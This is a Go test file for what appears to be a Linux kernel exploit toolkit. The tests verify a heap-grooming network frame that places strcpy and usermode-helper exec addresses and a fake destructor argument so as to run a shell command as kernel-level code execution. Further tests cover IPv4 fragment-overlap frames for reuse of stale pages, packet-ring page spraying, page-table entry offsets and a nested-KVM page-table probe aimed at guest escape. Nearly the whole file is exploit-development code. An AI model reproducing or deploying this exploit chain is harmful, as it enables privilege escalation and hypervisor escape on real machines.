package main

import (
	"bytes"
	"encoding/binary"
	"net"
	"os"
	"testing"
	"unsafe"
)

func TestStalePageGroomFrameUsermodeHelperLayout(t *testing.T) {
	const (
		head     = uint64(0xffffa0e9822c8000)
		strcpy   = uint64(0xffffffffb8e2aa30)
		exec     = uint64(0xffffffffb8317cc0)
		noop     = uint64(0xffffffffb8295590)
		uargAt   = 120
		copyLen  = 116
		fakeUarg = uint64(184)
	)
	frame, err := stalePageGroomFrame(0x6b, head, 0, 0, 0, strcpy, 0, exec, noop,
		"echo BENGSKY_RCE_OK >/tmp/bengsky-rce")
	if err != nil {
		t.Fatal(err)
	}
	if got := len(frame); got != 3456 {
		t.Fatalf("frame length=%d, want 3456", got)
	}
	source := frame[uargAt : uargAt+copyLen]
	if at := bytes.IndexByte(source, 0); at >= 0 {
		t.Fatalf("strcpy source contains an early NUL at byte %d", at)
	}
	if got := frame[uargAt+copyLen]; got != 0 {
		t.Fatalf("strcpy terminator=%#x, want 0", got)
	}

	want64 := map[int]uint64{
		0:   head + fakeUarg + 80,
		8:   head + 0x311,
		16:  head + 0x911,
		24:  head + 0x331,
		32:  head + 0x820,
		40:  head + 0x511,
		48:  head + 0x711,
		56:  head + 0x791,
		72:  noop,
		80:  strcpy,
		88:  head + 0x551,
		96:  exec,
		104: head + 0xb11,
	}
	for offset, want := range want64 {
		if got := binary.LittleEndian.Uint64(source[offset : offset+8]); got != want {
			t.Errorf("source[%d]=%#x, want %#x", offset, got, want)
		}
	}
	if got := binary.LittleEndian.Uint32(source[112:116]); got != 0x7f7f7f7f {
		t.Errorf("oversized skb len=%#x, want 0x7f7f7f7f", got)
	}
	if got := binary.LittleEndian.Uint64(frame[104:112]); got != head+fakeUarg {
		t.Errorf("destructor_arg=%#x, want %#x", got, head+fakeUarg)
	}
	if got := binary.LittleEndian.Uint32(frame[0xb10-64 : 0xb10-60]); got != 0x02020202 {
		t.Errorf("fake nf_conntrack refcount=%#x, want 0x02020202", got)
	}
}

func TestStalePageGroomFrameFragmentDescriptor(t *testing.T) {
	const page = uint64(0xffffd246c008b200)
	frame, err := stalePageGroomFrame(0x6b, 0, page, 0, 0, 0, 0, 0, 0, "")
	if err != nil {
		t.Fatal(err)
	}
	if got := binary.LittleEndian.Uint64(frame[104:112]); got != 0 {
		t.Fatalf("destructor_arg=%#x, want zero", got)
	}
	if got := binary.LittleEndian.Uint64(frame[112:120]); got != page {
		t.Fatalf("frags[0].netmem=%#x, want %#x", got, page)
	}
	if got := binary.LittleEndian.Uint32(frame[120:124]); got != 1 {
		t.Fatalf("frags[0].len=%d, want 1", got)
	}
	if got := binary.LittleEndian.Uint32(frame[124:128]); got != 0 {
		t.Fatalf("frags[0].offset=%d, want 0", got)
	}
}

func TestStaleFragSeedFrame(t *testing.T) {
	frame := staleFragSeedFrame(8192, 0x73)
	if len(frame) != 8192 {
		t.Fatalf("length=%d, want 8192", len(frame))
	}
	if got := binary.BigEndian.Uint16(frame[12:14]); got != ethPExperiment {
		t.Fatalf("EtherType=%#x, want %#x", got, ethPExperiment)
	}
	if !bytes.Equal(frame[14:64], bytesRepeat(50, 0x73)) {
		t.Fatal("seed payload does not retain marker")
	}
}

func TestStalePaddedGSOFrame(t *testing.T) {
	original := []byte{1, 2, 3, 4}
	padded := stalePaddedGSOFrame(original, 8192, 0x74)
	if len(padded) != 8192 {
		t.Fatalf("length=%d, want 8192", len(padded))
	}
	if !bytes.Equal(padded[:len(original)], original) {
		t.Fatalf("prefix=%x, want %x", padded[:len(original)], original)
	}
	if !bytes.Equal(padded[len(original):64], bytesRepeat(64-len(original), 0x74)) {
		t.Fatal("padding does not retain marker")
	}
}

func TestStaleNaturalFragmentGeometry(t *testing.T) {
	c := cfg{}
	applyStaleNaturalFrag(&c)
	if !c.page || c.vlanTags != 69 || c.staleOptSkip != 6 || c.staleOptLen != 7 {
		t.Fatalf("unexpected natural fragment configuration: %+v", c)
	}
	shortIP := ipv4PacketWithOptionsFor(8, true, bytesRepeat(8, 0x42), ipID, nil,
		net.ParseIP("192.0.2.2"), net.ParseIP("192.0.2.1"), ipProtoRaw)
	mac := net.HardwareAddr{2, 0, 0, 0, 0, 1}
	shortFrame := egressFrame(shortIP, mac, mac, c.vlanTags)
	if len(shortFrame) != c.staleFragHdrLen {
		t.Fatalf("short frame length=%d, want hdr_len=%d", len(shortFrame), c.staleFragHdrLen)
	}
	if c.staleFragPadLen-c.staleFragHdrLen != 32768 {
		t.Fatalf("non-linear length=%d, want one order-3 page", c.staleFragPadLen-c.staleFragHdrLen)
	}
	if got := len(stalePaddedGSOFrame(shortFrame, c.staleFragPadLen, 0x74)); got != 33086 {
		t.Fatalf("padded length=%d, want 33086", got)
	}
}

func TestStaleNaturalOverlapGeometry(t *testing.T) {
	c := cfg{}
	applyStaleNaturalFrag(&c)
	middle, head, tail := staleNaturalOverlapFrames(c, ipID+1)
	if len(middle) != c.staleFragPadLen {
		t.Fatalf("middle frame length=%d, want %d", len(middle), c.staleFragPadLen)
	}
	if len(head) != ethLen+ipLen+8 || len(tail) != ethLen+ipLen+8 {
		t.Fatalf("completion frame lengths head=%d tail=%d, want %d", len(head), len(tail), ethLen+ipLen+8)
	}
	if got := len(middle) - c.staleFragHdrLen; got != 32768 {
		t.Fatalf("middle nonlinear length=%d, want 32768", got)
	}
	middleIP := ipv4Of(middle)
	tailIP := ipv4Of(tail)
	if middleIP == nil || tailIP == nil {
		t.Fatal("overlap frames do not contain IPv4")
	}
	middlePayloadLen := int(binary.BigEndian.Uint16(middleIP[2:])) - ipLen
	tailOffset := int(binary.BigEndian.Uint16(tailIP[6:])&0x1fff) * 8
	if middlePayloadLen != 32776 || tailOffset != 32784 {
		t.Fatalf("middle payload=%d tail offset=%d, want 32776 and 32784", middlePayloadLen, tailOffset)
	}
}

func TestStaleNaturalOverlapLocalReassemblyGeometry(t *testing.T) {
	c := cfg{}
	applyStaleNaturalFrag(&c)
	want := net.ParseIP("10.0.0.1").To4()
	middle, head, bridge, tail := staleNaturalLocalCoalesceFrames(c, ipID+2)
	for name, frame := range map[string][]byte{"middle": middle, "head": head, "bridge": bridge, "tail": tail} {
		ip := ipv4Of(frame)
		if ip == nil {
			t.Fatalf("%s frame does not contain IPv4", name)
		}
		if got := net.IP(ip[16:20]); !got.Equal(want) {
			t.Fatalf("%s destination=%s, want %s", name, got, want)
		}
		if ipChecksum(ip[:int(ip[0]&0x0f)*4]) != 0 {
			t.Fatalf("%s has an invalid IPv4 checksum", name)
		}
	}
	middleIP := ipv4Of(middle)
	bridgeIP := ipv4Of(bridge)
	tailIP := ipv4Of(tail)
	if got := int(binary.BigEndian.Uint16(bridgeIP[6:])&0x1fff) * 8; got != 8 {
		t.Fatalf("bridge offset=%d, want 8", got)
	}
	if got := int(binary.BigEndian.Uint16(middleIP[6:])&0x1fff) * 8; got != 32 {
		t.Fatalf("middle offset=%d, want 32", got)
	}
	middlePayloadLen := int(binary.BigEndian.Uint16(middleIP[2:])) - ipLen
	if got := int(binary.BigEndian.Uint16(tailIP[6:])&0x1fff) * 8; got != 32+middlePayloadLen {
		t.Fatalf("tail offset=%d, want %d", got, 32+middlePayloadLen)
	}
}

func TestStaleNaturalPCPPrimeGeometry(t *testing.T) {
	c := cfg{}
	applyStaleNaturalFrag(&c)
	middle, head, tail := staleNaturalOverlapFramesForProto(c, ipID+5,
		net.ParseIP("10.0.0.1").To4(), ipProtoPCP)
	for name, frame := range map[string][]byte{"middle": middle, "head": head, "tail": tail} {
		ip := ipv4Of(frame)
		if ip == nil {
			t.Fatalf("%s frame does not contain IPv4", name)
		}
		if got := ip[9]; got != ipProtoPCP {
			t.Fatalf("%s protocol=%d, want %d", name, got, ipProtoPCP)
		}
		if got := net.IP(ip[16:20]); !got.Equal(net.ParseIP("10.0.0.1")) {
			t.Fatalf("%s destination=%s, want 10.0.0.1", name, got)
		}
	}
}

func TestStaleNaturalLocalSingleRefGeometry(t *testing.T) {
	c := cfg{}
	applyStaleNaturalFrag(&c)
	head, bridge := staleNaturalLocalSingleRefFrames(c, ipID+3)
	if len(head) != c.staleFragPadLen {
		t.Fatalf("padded head length=%d, want %d", len(head), c.staleFragPadLen)
	}
	if len(ipv4Of(head)) < ipLen+8 {
		t.Fatal("single-ref head does not contain its logical IPv4 payload")
	}
	bridgeIP := ipv4Of(bridge)
	if bridgeIP == nil {
		t.Fatal("single-ref bridge does not contain IPv4")
	}
	if got := int(binary.BigEndian.Uint16(bridgeIP[6:])&0x1fff) * 8; got != 8 {
		t.Fatalf("single-ref bridge offset=%d, want 8", got)
	}
	if binary.BigEndian.Uint16(bridgeIP[6:])&0x2000 != 0 {
		t.Fatal("single-ref bridge must complete the local datagram")
	}
	if got := int(binary.BigEndian.Uint16(bridgeIP[2:])) - ipLen; got != 512 {
		t.Fatalf("single-ref bridge payload=%d, want 512", got)
	}
	jumbo := staleNaturalJumboFragment(c, ipID+4, 8, 0x77)
	if len(jumbo) != c.staleFragPadLen {
		t.Fatalf("single-ref jumbo length=%d, want %d", len(jumbo), c.staleFragPadLen)
	}
}

func TestPacketRingOrderZeroRequest(t *testing.T) {
	req := packetRingRequest(64 << 20)
	if req.BlockSize != 4096 || req.FrameSize != 4096 {
		t.Fatalf("block_size=%d frame_size=%d, want order-0 pages", req.BlockSize, req.FrameSize)
	}
	if req.BlockNr != 16384 || req.FrameNr != req.BlockNr {
		t.Fatalf("block_nr=%d frame_nr=%d, want 16384", req.BlockNr, req.FrameNr)
	}
}

func TestSparsePTEFirstOffset(t *testing.T) {
	for base, want := range map[uintptr]int{
		0:        0,
		0x1000:   0x1ff000,
		0x1ff000: 0x1000,
		0x200000: 0,
	} {
		if got := sparsePTEFirstOffset(base); got != want {
			t.Errorf("base=%#x offset=%#x, want %#x", base, got, want)
		}
	}
	const pte = uint64(0x8000000012345067)
	if got := pte & x86PTEAddressMask; got != 0x12345000 {
		t.Fatalf("PTE physical address=%#x, want %#x", got, uint64(0x12345000))
	}
}

func TestKVMNPTABIAndTouchProgram(t *testing.T) {
	if got := unsafe.Sizeof(kvmUserspaceMemoryRegion{}); got != 32 {
		t.Fatalf("kvm_userspace_memory_region size=%d, want 32", got)
	}
	if got := unsafe.Sizeof(kvmRegs{}); got != 144 {
		t.Fatalf("kvm_regs size=%d, want 144", got)
	}
	if got := unsafe.Sizeof(kvmSregs{}); got != 312 {
		t.Fatalf("kvm_sregs size=%d, want 312", got)
	}
	if got := kvmIOC(iocWrite, kvmSetUserMemoryRegionNR, unsafe.Sizeof(kvmUserspaceMemoryRegion{})); got != 0x4020ae46 {
		t.Fatalf("KVM_SET_USER_MEMORY_REGION=%#x, want %#x", got, uintptr(0x4020ae46))
	}
	if got := kvmIOC(iocWrite, kvmSetRegsNR, unsafe.Sizeof(kvmRegs{})); got != 0x4090ae82 {
		t.Fatalf("KVM_SET_REGS=%#x, want %#x", got, uintptr(0x4090ae82))
	}
	if got := kvmIOC(iocRead, kvmGetSregsNR, unsafe.Sizeof(kvmSregs{})); got != 0x8138ae83 {
		t.Fatalf("KVM_GET_SREGS=%#x, want %#x", got, uintptr(0x8138ae83))
	}
	code, err := kvmNPTTouchProgram(7, 123)
	if err != nil {
		t.Fatal(err)
	}
	if len(code) != 27 {
		t.Fatalf("touch program length=%d, want 27", len(code))
	}
	if got, want := binary.LittleEndian.Uint32(code[2:6]), uint32(kvmSparseGPA+7*pmdSpan); got != want {
		t.Fatalf("touch address=%#x, want %#x", got, want)
	}
	if got := binary.LittleEndian.Uint32(code[8:12]); got != 123 {
		t.Fatalf("touch count=%d, want 123", got)
	}
	if got := binary.LittleEndian.Uint32(code[18:22]); got != pmdSpan {
		t.Fatalf("touch stride=%#x, want %#x", got, uint32(pmdSpan))
	}
	if code[24] != 0x75 || code[25] != 0xf2 || code[26] != 0xf4 {
		t.Fatalf("touch loop tail=%x, want 75f2f4", code[24:])
	}
}

func TestKVMNPTProbeTouch(t *testing.T) {
	if os.Getenv("PWNESC_KVM_NPT_TEST") != "1" {
		t.Skip("set PWNESC_KVM_NPT_TEST=1 in a disposable nested-KVM fixture")
	}
	probe, err := prepareKVMNPTProbe(384)
	if err != nil {
		t.Fatal(err)
	}
	if err := probe.touch(probe.warmEnd, probe.firstEnd-probe.warmEnd); err != nil {
		t.Fatal(err)
	}
	if err := probe.touch(probe.firstEnd, probe.count-probe.firstEnd); err != nil {
		t.Fatal(err)
	}
	if changed := probe.changedMarkerPages(); len(changed) != 0 {
		t.Fatalf("nested guest touch changed backing markers at pages %v", changed)
	}
}

func TestIPv4PayloadWindow(t *testing.T) {
	id := uint16(ipID + 2)
	payload := bytesRepeat(64, 0x72)
	copy(payload[23:31], []byte("OVERLAP"))
	pkts := [][]byte{
		ipv4PacketWithOptions(32, false, payload[32:], id, nil),
		ipv4PacketWithOptions(0, true, payload[:32], id, nil),
	}
	got, ok := ipv4PayloadWindow(pkts, 23, len("OVERLAP"))
	if !ok || string(got) != "OVERLAP" {
		t.Fatalf("window ok=%t got=%q", ok, got)
	}
}
